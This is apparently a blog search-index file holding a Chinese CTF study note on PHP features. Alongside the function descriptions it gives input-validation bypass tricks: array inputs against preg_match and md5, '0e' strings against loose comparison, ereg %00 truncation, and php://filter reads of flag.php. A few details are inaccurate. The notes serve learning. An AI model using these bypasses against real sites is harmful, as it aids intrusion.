<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow-sqli-labs</title>
      <link href="/2025/03/04/ctfshow-sqli-labs/"/>
      <url>/2025/03/04/ctfshow-sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="web-517字符型注入"><a href="#web-517字符型注入" class="headerlink" title="web-517字符型注入"></a>web-517字符型注入</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性</title>
      <link href="/2025/03/02/php%E7%89%B9%E6%80%A7/"/>
      <url>/2025/03/02/php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p><a href="https://www.runoob.com/php/php-preg_match.html">preg_match函数用法</a>，<a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式语法</a>。</p><p><code>preg_match()</code>：执行正则表达式，进行字符串过滤。。<code>[0-9]</code>匹配0-9之间的所有字符。<code>/</code>相当于一个分隔符，<code>/../</code>之间的内容就是正则的语法。绕过方法：变量num为人工分配 ID 键的数值型数组，<code>preg_match()</code>就会失效。如<code>num[]=1,num[0]=1</code></p><hr><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><p><a href="https://www.runoob.com/php/php-intval-function.html">intval函数用法</a></p><p><strong><code>intval()</code>：将变量的值默认转化为十进制。绕过方法：可以使用&#x3D;&#x3D;的特性，如+16、16.0；或者进制转换后，左右变量也相等。</strong>   </p><p><strong>int intval ( mixed $var [, int $base &#x3D; 10 ] )</strong></p><p><strong>参数说明：</strong><br>    <strong>$var：要转换成 integer 的数量值。</strong><br>    <strong>$base：转化所使用的进制。</strong><br><strong>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</strong><br>    <strong>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</strong><br>    <strong>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</strong><br>    <strong>将使用 10 进制 (decimal)。</strong></p><ol><li><strong>使用array()类型的数组，<code>intval</code>遇到空数组为0，非空数组为1.</strong></li><li><strong>使用人工分配 ID 键的数值型数组，<code>intval</code>遇到空数组为0，非空数组为1。</strong></li></ol><hr><h3 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h3><p>在php中，三个等号“&#x3D;&#x3D;&#x3D;”是全等比较运算符，用于比较两个操作数的值是否相等，同时检测它们的类型</p><p>是否相同；只有两边的值和数据类型都相等时，运算结果才是TRUE。可以使用<strong>进制转换</strong>进行绕过</p><hr><h3 id="正则匹配模式"><a href="#正则匹配模式" class="headerlink" title="正则匹配模式"></a>正则匹配模式</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell">/i表示匹配大小写<br><br>字符 ^ 和 <span class="hljs-variable">$</span> 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾<br><br>m<br>多(more)行匹配<br>若存在换行\n并且有开始^或结束<span class="hljs-variable">$</span>符的情况下，<br>将以换行为分隔符，逐行进行匹配<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;abc\nabc&quot;</span>;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&quot;/^abc<span class="hljs-variable">$</span>/m&quot;</span>;<br>preg_match(<span class="hljs-variable">$preg</span>, <span class="hljs-variable">$str</span>,<span class="hljs-variable">$matchs</span>);<br>这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。<br><br>s<br>特殊字符圆点 . 中包含换行符<br>默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;abggab\nacbs&quot;</span>;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&quot;/b./s&quot;</span>;<br>preg_match_all(<span class="hljs-variable">$preg</span>, <span class="hljs-variable">$str</span>,<span class="hljs-variable">$matchs</span>);<br>这样匹配到的有三个 bg b\n bs<br><br>g<br>全局匹配，查找所有匹配项<br><br>A<br>强制从目标字符串开头匹配;<br><br>D<br>如果使用<span class="hljs-variable">$</span>限制结尾字符,则不允许结尾有换行; <br><br>e<br>配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; <br></code></pre></td></tr></table></figure><hr><h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><p>在php中两个等号&#x3D;&#x3D;是弱类型比较，只需要值相等，不会检测类型是否相同，类型不同时会自动转换</p><p>特殊情况：</p><p>0exxx类型字符串不管0e后的数字如何，都为0所以可以绕过弱类型比较</p><p>如果一个0与一个字符串进行弱类型比较，字符串会被转化为0，最后比较结果为true</p><hr><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><p><strong>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</strong><br><strong>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</strong><br><strong>strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</strong><br><strong>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</strong></p><hr><h3 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h3><p><code>highlight_file()</code> 函数用于将指定文件的内容以 HTML 格式进行高亮显示，并输出到浏览器。</p><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$return</span> = <span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>参数：</p><ul><li><code>$filename</code>：必需，要高亮显示的文件路径。</li><li><code>$return</code>：可选，如果设置为 <code>true</code>，则返回高亮显示的文件内容，否则将内容直接输出到浏览器。</li></ul><p>返回值： 如果 <code>$return</code> 参数设置为 <code>true</code>，则返回高亮显示的文件内容；否则没有返回值。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&quot;example.php&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上述示例将会将名为 <code>example.php</code> 的文件内容以 HTML 格式进行高亮显示，并输出到浏览器。</p><hr><h3 id="md5-加密函数"><a href="#md5-加密函数" class="headerlink" title="md5()加密函数"></a>md5()加密函数</h3><p><a href="https://www.runoob.com/php/func-string-md5.html">md5函数用法</a></p><p>md5() 函数计算字符串的 MD5 散列。</p><p>md5() 函数使用 RSA 数据安全，包括 MD5 报文摘要算法。</p><p>来自 RFC 1321 的解释 -  MD5 报文摘要算法：<em>MD5 报文摘要算法将任意长度的信息作为输入值，并将其换算成一个 128  位长度的”指纹信息”或”报文摘要”值来代表这个输入值，并以换算后的值作为结果。MD5  算法主要是为数字签名应用程序而设计的；在这个数字签名应用程序中，较大的文件将在加密（这里的加密过程是通过在一个密码系统下[如：RSA]的公开密钥下设置私有密钥而完成的）之前以一种安全的方式进行压缩。</em></p><p>如需计算文件的 MD5 散列，请使用 <a href="https://www.runoob.com/php/func-string-md5-file.html">md5_file()</a> 函数。</p><p><strong>md5() 函数不能处理数组，数组都返回 null，md5(a[])  结果为 null。</strong></p><hr><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><strong>&amp;符号的利用</strong></p><p>感觉有点像c里的取地址符，指针</p><p>比如：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>var <span class="hljs-variable">$enter</span>;<br>var <span class="hljs-variable">$secret</span>;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = new test();<br><span class="hljs-variable">$a</span>-&gt;enter = &amp;<span class="hljs-variable">$a</span>-&gt;secret;<br></code></pre></td></tr></table></figure><p>这里就相当于a对象中的成员属性enter的值引用了a对象中成员属性secret的值，所以当secret的值改变的时候，enter依然与enter相同</p><hr><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><a href="https://www.php.net/manual/zh/function.in-array.php">in_array()用法</a></p><p>in_array()函数搜索数组中是否存在指定的值。</p><p>语法：<code>in_array(search,array,type)</code></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">参数描述<br>search必需。规定要在数组搜索的值<span class="hljs-built_in"></span><br><span class="hljs-built_in">array</span>必需。规定要搜索的数组<br>type可选，如果设置该参数为true，则检查搜索的数据与数组的值的类型是否相同<br></code></pre></td></tr></table></figure><p><strong>type ： 类型，true全等 ，false非全等（默认）</strong></p><hr><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><p><a href="https://www.php.net/manual/zh/function.file-put-contents.php">file_put_contents()用法</a></p><ul><li>该函数访问文件时，遵循以下规则：</li><li>如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 filename 副本的内置路径</li><li>如果文件不存在，将创建一个文件</li><li>打开文件</li><li>如果设置了 LOCK_EX，那么将锁定文件</li><li>如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容</li><li>向文件中写入数据</li><li></li><li>关闭文件并对所有文件解锁</li><li>如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">file_put_contents</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span> [, resource <span class="hljs-variable">$context</span> ]] )<br><br>filename： 必需。规定要写入数据的文件。 如果文件不存在，则创建一个新文件。<br>data： 必需。规定要写入文件的数据。可以是字符串、数组或数据流。<br></code></pre></td></tr></table></figure><hr><h3 id="逻辑运算符优先级"><a href="#逻辑运算符优先级" class="headerlink" title="逻辑运算符优先级"></a>逻辑运算符优先级</h3><p><a href="https://www.runoob.com/php/php-operators.html">逻辑运算符详解</a></p><p>“&amp;&amp;” &gt; “||” &gt; “&#x3D;” &gt; “and”</p><hr><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><p><a href="https://www.php.net/manual/zh/function.is-numeric.php">is_numeric函数详解</a></p><p>用于检测变量是否为数字或数字字符串。<br> 如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">is_numeric</span><span class="hljs-params">(mixed <span class="hljs-variable">$value</span>)</span></span>: bool<br></code></pre></td></tr></table></figure><p>参数</p><ul><li><code>value</code> 需要检测的变量。</li></ul><p>返回值</p><ul><li>如果 <code>value</code> 是数字或数字字符串，    返回 **<code>true</code>**，否则返回 **<code>false</code>**。</li></ul><hr><h3 id="ReflectionClass反射类"><a href="#ReflectionClass反射类" class="headerlink" title="ReflectionClass反射类"></a>ReflectionClass反射类</h3><p><strong>PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。</strong></p><p>反射类可以说成是类的一个映射，可以利用反射类来代替有关类的应用的任何语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;123123123&#125;&quot;</span>;<br><span class="hljs-keyword">const</span>  PI=<span class="hljs-number">3.14</span>;<br><span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&lt;/br&gt;&quot;</span>;<br>&#125;<br>&#125;<br><br>/有这么一个A类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射<br><span class="hljs-comment">//现在我可以通过反射来获取这个类中的方法，属性，常量</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&#x27;A&#x27;</span>);<span class="hljs-comment">//实例化反射对象,映射A类的信息</span><br><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getConstants</span>());  获取一组常量<br>输出<br> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;PI&quot;</span>]=&gt;<br>  <span class="hljs-keyword">float</span>(<span class="hljs-number">3.14</span>)<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>());    获取类名<br>输出<br><span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;A&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getStaticProperties</span>()); 获取静态属性<br>输出<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;flag&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">15</span>) <span class="hljs-string">&quot;flag&#123;123123123&#125;&quot;</span><br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getMethods</span>()); 获取类中的方法<br>输出<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">object</span>(ReflectionMethod)<span class="hljs-comment">#2 (2) &#123;</span><br>    [<span class="hljs-string">&quot;name&quot;</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;hello&quot;</span><br>    [<span class="hljs-string">&quot;class&quot;</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;A&quot;</span><br>  &#125;<br>  <br> <br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">getProperties</span>());  <span class="hljs-comment">//获取所有属性</span><br><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><p><a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func函数具体详解</a></p><p><code>call_user_func($callback, parameter)</code>：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数；</p><p>第一个参数是必须的，第二个参数可选</p><p>call_user_func支持传入数组，且可以用数组来调用静态方法</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ans</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$ans</span>[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$ans</span>);<br><br><span class="hljs-comment">#输出</span><br>flag<br></code></pre></td></tr></table></figure><hr><h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><p><a href="https://www.php.net/manual/zh/function.substr.php">substr函数详解</a></p><p>substr() 可以截取字符串</p><p>语法</p><pre><code>string substr( $str, start, length); $str ：被截取的字符串。 start ：开始截取的位置。 length ：截取的长度。</code></pre><p>返回值</p><p>截取成功，就返回截取的字符串<br>start 超过字符串长度，就返回 false<br>start 和 length 设置成不合理的截取范围，就返回空字符串<br>substr((xxx),1,1):表示从第1个字母开始，显示1个字母，从1开始计数</p><hr><h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin()"></a>hex2bin()</h3><p><a href="https://www.php.net/manual/zh/function.hex2bin.php">hex2bin函数详解</a></p><p><code>hex2bin()</code>：将十六进制字符转化为ASCII码字符。</p><hr><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><a href="https://www.cnblogs.com/hithub/p/16299548.html">CTF之php伪协议以及能使用php伪协议的函数</a></p><hr><h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h3><p><a href="https://www.php.net/manual/zh/function.sha1.php">sha1详解</a></p><p>sha1 — 计算字符串的 sha1 散列</p><p><strong>sha1</strong>(string <code>$string</code>, bool <code>$binary</code> &#x3D; <strong><code>false</code></strong>): </p><p>以字符串形式返回 sha1 散列值。</p><p>绕过方法：不能处理数组，而且能构造出0exxxx类型数据，能绕过弱类型比较</p><hr><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>变量覆盖是把变量的值当作另一个变量的名</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$a&#x27;</span>;<span class="hljs-comment">#b</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;<span class="hljs-comment">#c</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$$a&#x27;</span> <span class="hljs-comment">#c</span><br></code></pre></td></tr></table></figure><hr><h3 id="die"><a href="#die" class="headerlink" title="die()"></a>die()</h3><p>PHP 中的 die() 函数是一个终止脚本执行的函数，它会立即结束当前正在运行的脚本，并可选地输出一条错误信息（可以输出变量）</p><p><strong>用法</strong></p><p>die() 函数的语法如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">die</span><span class="hljs-params">(message)</span></span><br></code></pre></td></tr></table></figure><p>参数 message 是一个可选的字符串，将作为错误信息在脚本终止前显示。如果没有提供错误信息，则不会显示任何内容。</p><hr><h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h3><p><a href="https://www.runoob.com/php/func-string-parse-str.html">parse_str函数详解</a></p><p>parse_str() 函数把查询字符串解析到变量中。</p><p><strong>注释：</strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p><p>语法：</p><p>parse_str(<em>string,array</em>)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要解析的字符串。</td></tr><tr><td><em>array</em></td><td>可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=Peter&amp;age=43&quot;</span>,<span class="hljs-variable">$myArray</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$myArray</span>);<br><span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-title function_ invoke__">Array</span> ( [name] =&gt; Peter [age] =&gt; <span class="hljs-number">43</span> ) <br><br>如果<span class="hljs-keyword">string</span>参数填xxx=后面没有值<br>则<span class="hljs-variable">$myArray</span>[<span class="hljs-string">&#x27;xxx&#x27;</span>]=<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><hr><h3 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h3><p><code>ereg()</code>正则匹配函数，类似<code>preg_match</code>，php7.0已删除。<code>ereg()</code>存在%00截断漏洞，也就是说在字符串中遇到%00，php解析器会认为字符串结束了。<strong>而且截断之后，%00后面的值会重新赋值给原来的变量。</strong></p><hr><h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><p>strrev() ：反转字符串</p><hr><h3 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h3><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121780909">php原生类总结</a></p><hr><h3 id="toString-魔术方法"><a href="#toString-魔术方法" class="headerlink" title="__toString()魔术方法"></a>__toString()魔术方法</h3><p>将一个对象作为字符串使用时（<code>echo &lt;一个对象&gt;</code>），php会自动调用该对象的 <code>__toString()</code>方法来获取<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8%E7%A4%BA&spm=1001.2101.3001.7020">字符串表示</a>。注意，<code>__toString()</code>方法在对象被隐式转换为字符串时（<code>echo &lt;一个对象&gt;</code>）才会触发，如果直接调用该方法，不会有任何效果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Object name:&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myclass</span>(<span class="hljs-string">&quot;My Object&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>; <span class="hljs-comment">// 输出对象的字符串表示，自动调用__toString()方法</span><br><span class="hljs-meta">?&gt;</span><br><br>输出<br>Object name:My Object<br></code></pre></td></tr></table></figure><p><strong>php中，自带 <code>__toString()</code>方法的内置类有：<code>DataTime</code>、<code>Exception</code>、<code>SimpleXMLElement</code>。</strong></p><hr><h3 id="php超全局变量"><a href="#php超全局变量" class="headerlink" title="php超全局变量"></a>php超全局变量</h3><p><a href="https://www.runoob.com/php/php-superglobals.html">php超级全局变量详解</a></p><hr><h3 id="php伪协议（filter）"><a href="#php伪协议（filter）" class="headerlink" title="php伪协议（filter）"></a>php伪协议（filter）</h3><p>php:&#x2F;&#x2F;filter是php中的伪协议主要用于在输入和输出流上应用过滤器。基本语法是：php:&#x2F;&#x2F;filter&#x2F;<filter>&#x2F;resource，其中<filter>是要应用的过滤器名称，resource是要过滤的资源。</filter></filter></p><pre><code>过滤读取的数据//先读取flag.php的内容，再进行base64编码，也就是说以后呈现的内容是经过base64编码后的内容。file_get_contents(&#39;php://filter/write=convert.base64-encode/resource=flag.php&#39;） 过滤写入的数据// 先将字符串hello world进行base64编码，再写入flag.php文件中，写的时候是先进行base64解码，再写。也就是说在写的时候，先执行php://filter/write=convert.base64-decode对字符串进行解码。$data=&#39;hello world&#39;;file_put_contents(&#39;php://filter/write=convert.base64-decode/resource=flag.php&#39;，base64($data))</code></pre><hr><h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift">语法<br>trim(string,charlist)<br><br>参数描述<br>string        必需<span class="hljs-operator">。</span>规定要检查的字符串<span class="hljs-operator">。</span><br>charlist    可选<span class="hljs-operator">。</span>规定从字符串中删除哪些字符<span class="hljs-operator">。</span>如果省略该参数，则移除下列所有字符：<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\0</span>&quot;</span>       <span class="hljs-operator">-</span> <span class="hljs-type">NULL</span><br>                <span class="hljs-string">&quot;<span class="hljs-subst">\t</span>&quot;</span>       <span class="hljs-operator">-</span> 制表符<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>       <span class="hljs-operator">-</span> 换行<br>                <span class="hljs-string">&quot;\x0B&quot;</span>     <span class="hljs-operator">-</span> 垂直制表符<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\r</span>&quot;</span>       <span class="hljs-operator">-</span> 回车<br>                <span class="hljs-string">&quot; &quot;</span>        <span class="hljs-operator">-</span> 空格<br></code></pre></td></tr></table></figure><hr><h3 